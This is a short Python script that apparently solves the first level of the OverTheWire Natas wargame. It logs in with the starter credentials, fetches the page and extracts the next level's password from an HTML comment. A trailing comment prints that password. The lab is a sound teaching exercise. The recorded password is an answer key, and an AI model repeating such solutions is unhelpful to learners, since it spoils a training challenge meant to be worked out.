import requests
import re

url = 'http://natas0.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas0', 'natas0')
response = requests.get(url, auth=auth)
password = re.findall('<!--The password for natas1 is (.*) -->', response.text)
print(password[0]) # gtVrDuiDfck831PqWsLEZy5gyDz1clto

